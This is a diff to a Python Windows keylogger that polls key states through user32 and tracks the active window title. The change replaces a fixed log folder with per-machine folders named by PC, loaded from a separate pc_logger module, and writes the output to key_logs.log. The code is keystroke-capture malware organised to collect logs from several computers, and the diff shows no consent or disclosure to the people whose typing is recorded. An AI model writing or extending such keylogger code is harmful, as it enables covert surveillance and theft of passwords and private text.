@@ -4,6 +4,7 @@ import ctypes
 import ctypes.wintypes as w
 from datetime import datetime
 import sys
+import importlib.util
 
 user32 = ctypes.WinDLL('user32', use_last_error=True)
 
@@ -111,14 +112,34 @@ for i in range(VK_F1, VK_F24 + 1):
     VK_TO_NAME[i] = f"VK_F{i - VK_F1 + 1}"
 for i in range(VK_NUMPAD0, VK_NUMPAD9 + 1):
     VK_TO_NAME[i] = f"VK_NUMPAD{i - VK_NUMPAD0}"
-
+    
 INTERVAL_MS = 20
 DEBUG = False
 
-script_dir = os.path.dirname(os.path.abspath(__file__))
-log_dir = os.path.join(script_dir, "PCLogs")
-os.makedirs(log_dir, exist_ok=True)
-LOG_FILE = os.path.join(log_dir, "logs.log")
+PC_LOGGER_PATH = os.path.abspath(
+    os.path.join(os.path.dirname(__file__), "..", "modules", "pc_logger.py")
+)
+
+# Load the module only if the file exists
+if not os.path.isfile(PC_LOGGER_PATH):
+    print(f"[!] pc_logger.py not found at {PC_LOGGER_PATH}", file=sys.stderr)
+    # Fallback: use a generic folder next to the script
+    log_dir = os.path.join(os.path.dirname(__file__), "PCLogs")
+    os.makedirs(log_dir, exist_ok=True)
+    get_pc_log_folder = lambda create_if_missing=False: log_dir
+else:
+    spec = importlib.util.spec_from_file_location("pc_logger", PC_LOGGER_PATH)
+    pc_logger = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(pc_logger)
+    get_pc_log_folder = pc_logger.get_pc_log_folder   # <-- the function we need
+
+
+# ----------------------------------------------------------------------
+# 2. Determine the per-PC log folder (creates it if needed)
+# ----------------------------------------------------------------------
+log_dir = get_pc_log_folder(create_if_missing=True)   # <-- creates …/machine-ids/<PCNAME>/
+os.makedirs(log_dir, exist_ok=True)                  # safety net
+LOG_FILE = os.path.join(log_dir, "key_logs.log")
 
 last_key_state = bytearray(256)
 last_active_window = ""
